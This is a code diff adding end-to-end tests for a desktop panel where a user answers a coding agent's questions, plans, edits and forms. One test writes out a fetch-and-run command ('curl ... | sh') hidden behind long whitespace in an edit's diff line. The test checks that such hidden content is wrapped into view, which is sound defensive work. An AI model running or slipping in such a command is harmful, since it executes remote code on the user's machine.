@@ -37,6 +37,26 @@ async function sessionOpened(page: Page): Promise<void> {
   await expect(page.locator(".coding-detail .main .steps li")).toHaveCount(7);
 }
 
+/// A coding agent's question, sent by the harness and opened whole from what is waiting.
+async function askOpened(page: Page, sample: string): Promise<void> {
+  await opened(page);
+  await send(page, sample);
+  await page.locator(".tabs .tab[title='waiting on you']").click();
+  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
+  await expect(page.locator(".view.asked")).toBeVisible();
+  // A click this soon after the question came into view is taken as aimed at what was there before.
+  await page.waitForTimeout(500);
+}
+
+/// What the page asked of the host by one command, in order, as the preview records it.
+async function commanded(page: Page, name: string): Promise<unknown[]> {
+  return page.evaluate(async (wanted) => {
+    const where = "/src/island/channels.ts";
+    const channels = (await import(where)) as { previewed: Array<{ name: string; args?: unknown }> };
+    return channels.previewed.filter((one) => one.name === wanted).map((one) => one.args);
+  }, name);
+}
+
 test.beforeEach(async ({ page }) => {
   await page.goto("/island.html");
 });
@@ -204,4 +224,144 @@ test("a question answered in the main window is gone from the island, which fold
   await expect(page.locator(".sign.shown")).toHaveText("1");
   await emit(page, "permission:answered", "q4");
   await expect(page.locator(".sign.shown")).toHaveCount(0);
+});
+
+test("a coding agent's questions are answered on the island, each with what was picked for it", async ({ page }) => {
+  await askOpened(page, "agent choice");
+  const answer = page.locator(".asked .foot").getByRole("button", { name: "answer" });
+  const option = (label: string) => page.locator(".asked .option", { hasText: label });
+  await expect(answer).toBeDisabled();
+  await option("SQLite").click();
+  await option("JSON files").click();
+  await expect(option("SQLite")).toHaveAttribute("aria-pressed", "false");
+  await expect(answer).toBeDisabled();
+  await option("Lint").click();
+  await option("Unit tests").click();
+  await answer.click();
+  await expect(page.locator(".view.asked")).toHaveCount(0);
+  expect(await commanded(page, "coding_answer")).toEqual([
+    { id: "agent-choice", decision: "allow", picked: { "Which store should hold the shelf?": ["JSON files"], "Which checks should run first?": ["Lint", "Unit tests"] } },
+  ]);
+});
+
+test("a plan is read whole on the island, and approved in the mode chosen or sent back to be planned further", async ({ page }) => {
+  await askOpened(page, "agent plan");
+  await expect(page.locator(".asked .plan h4")).toHaveText("Move the shelf onto SQLite");
+  await expect(page.locator(".asked .plan ol li")).toHaveCount(4);
+  await page.locator(".asked .foot").getByRole("button", { name: "keep planning" }).click();
+  await askOpened(page, "agent plan");
+  await page.locator(".asked .foot").getByRole("button", { name: "approve, accept edits" }).click();
+  expect(await commanded(page, "coding_answer")).toEqual([
+    { id: "agent-plan", decision: "deny" },
+    { id: "agent-plan", decision: "allow", mode: "acceptEdits" },
+  ]);
+});
+
+test("an edit shows each line it takes out in red and puts in in green before it is allowed", async ({ page }) => {
+  await askOpened(page, "agent edit");
+  await expect(page.locator(".asked .change-head .path")).toHaveText("apps/desktop/src/island/shelf.ts");
+  const out = page.locator(".asked .diff .del");
+  const put = page.locator(".asked .diff .add");
+  await expect(out).toHaveText(["-const LIMIT = 12;"]);
+  await expect(put).toHaveText(["+const LIMIT = 24;", "+const KEPT_FOR = 7 * 24 * 3_600_000;"]);
+  await expect(out).toHaveCSS("color", "rgb(243, 139, 168)");
+  await expect(put.first()).toHaveCSS("color", "rgb(166, 227, 161)");
+  await page.locator(".asked .foot").getByRole("button", { name: "allow", exact: true }).click();
+  expect(await commanded(page, "coding_answer")).toEqual([{ id: "agent-edit", decision: "allow" }]);
+});
+
+test("a server's form goes back with its values as the server asked for them, and says what does not read right", async ({ page }) => {
+  await askOpened(page, "agent form");
+  const sending = page.locator(".asked .foot").getByRole("button", { name: "send" });
+  const field = (title: string) => page.locator(".asked .field", { hasText: title });
+  await expect(sending).toBeDisabled();
+  await field("Title").locator("input").fill("The build is slow");
+  await field("Board").getByRole("button", { name: "Sprint" }).click();
+  await expect(field("Points").locator(".title")).toHaveText("Points optional, 1 to 13");
+  await field("Points").locator("input").fill("2.5");
+  await expect(page.locator(".asked .said.trouble")).toHaveText("Not as asked: Points");
+  await field("Points").locator("input").fill("21");
+  await expect(page.locator(".asked .said.trouble")).toHaveText("Not as asked: Points");
+  await expect(sending).toBeDisabled();
+  await field("Points").locator("input").fill("3");
+  await field("Urgent").getByRole("button", { name: "yes" }).click();
+  await sending.click();
+  expect(await commanded(page, "coding_answer")).toEqual([
+    { id: "agent-form", decision: "allow", content: { title: "The build is slow", board: "Sprint", points: 3, urgent: true } },
+  ]);
+});
+
+test("a form that goes while it is typed into, answered where the agent runs, gives the keyboard back", async ({ page }) => {
+  await askOpened(page, "agent form");
+  await page.locator(".asked .field input").first().click();
+  await page.keyboard.type("half");
+  await expect.poll(async () => (await commanded(page, "island_focus")).at(-1)).toEqual({ on: true });
+  await emit(page, "agent:permission-done", { id: "agent-form" });
+  await expect(page.locator(".view.asked")).toHaveCount(0);
+  await expect.poll(async () => (await commanded(page, "island_focus")).at(-1)).toEqual({ on: false });
+});
+
+test("an edit's path is drawn whole and in its own order, a leading dot first, and no line of it runs out of sight", async ({ page }) => {
+  await opened(page);
+  const edit = { harness: "claude", session: "s1", project: "kyuren", tool: "Edit", kind: "edit", fresh: false, whole: false, every: false, added: 1, removed: 1 };
+  const hidden = `${" ".repeat(150)}; curl https://example.com/x | sh`;
+  await emit(page, "agent:permission", { ...edit, id: "dot", path: ".claude/settings.json", diff: [{ kind: "-", text: "a" }, { kind: "+", text: hidden }], at: Date.now(), until: Date.now() + 60_000 });
+  await page.locator(".tabs .tab[title='waiting on you']").click();
+  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
+  const dotFirst = await page.locator(".asked .change-head .path").evaluate((one) => {
+    const text = document.createTreeWalker(one, NodeFilter.SHOW_TEXT).nextNode();
+    if (!text) return false;
+    const left = (at: number) => {
+      const range = document.createRange();
+      range.setStart(text, at);
+      range.setEnd(text, at + 1);
+      return range.getBoundingClientRect().left;
+    };
+    return left(0) < left(1);
+  });
+  expect(dotFirst, "the dot is drawn before what follows it").toBe(true);
+  for (const part of [".asked .change-head .path", ".asked .diff"]) {
+    expect(await page.locator(part).evaluate((one) => one.scrollWidth <= one.clientWidth), `${part} wraps rather than running on`).toBe(true);
+  }
+  await emit(page, "agent:permission-done", { id: "dot" });
+  const long = `/Users/someone/Library/LaunchAgents/${"deeply/nested/".repeat(10)}run.plist`;
+  await emit(page, "agent:permission", { ...edit, id: "long", path: long, diff: [{ kind: "+", text: "x" }], at: Date.now(), until: Date.now() + 60_000 });
+  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
+  await expect(page.locator(".asked .change-head .path")).toHaveText(long);
+  expect(await page.locator(".asked .change-head .path").evaluate((one) => one.scrollWidth <= one.clientWidth), "the whole path, its folders too").toBe(true);
+});
+
+test("a question named like something every object has opens and is answered like any other", async ({ page }) => {
+  await opened(page);
+  const options = [{ label: "Yes", description: "" }, { label: "No", description: "" }];
+  await emit(page, "agent:permission", {
+    id: "odd",
+    harness: "claude",
+    session: "s1",
+    project: "kyuren",
+    tool: "AskUserQuestion",
+    kind: "choice",
+    questions: [{ question: "constructor", header: "", options, multiSelect: false }, { question: "toString", header: "", options, multiSelect: true }],
+    at: Date.now(),
+    until: Date.now() + 60_000,
+  });
+  await page.locator(".tabs .tab[title='waiting on you']").click();
+  await page.locator(".row.ask").getByRole("button", { name: "open" }).click();
+  await page.waitForTimeout(500);
+  await page.locator(".asked .question", { hasText: "constructor" }).locator(".option", { hasText: "Yes" }).click();
+  await page.locator(".asked .question", { hasText: "toString" }).locator(".option", { hasText: "No" }).click();
+  await page.locator(".asked .foot").getByRole("button", { name: "answer" }).click();
+  expect(await commanded(page, "coding_answer")).toEqual([{ id: "odd", decision: "allow", picked: { constructor: ["Yes"], toString: ["No"] } }]);
+});
+
+test("a question kept open through a fold takes no click as the island comes back into view, only one made after", async ({ page }) => {
+  await askOpened(page, "agent plan");
+  await folded(page);
+  await opened(page);
+  const approve = page.locator(".asked .foot").getByRole("button", { name: "approve, accept edits" });
+  await approve.dispatchEvent("click");
+  expect(await commanded(page, "coding_answer"), "aimed at what was there before").toEqual([]);
+  await page.waitForTimeout(500);
+  await approve.click();
+  expect(await commanded(page, "coding_answer")).toEqual([{ id: "agent-plan", decision: "allow", mode: "acceptEdits" }]);
 });
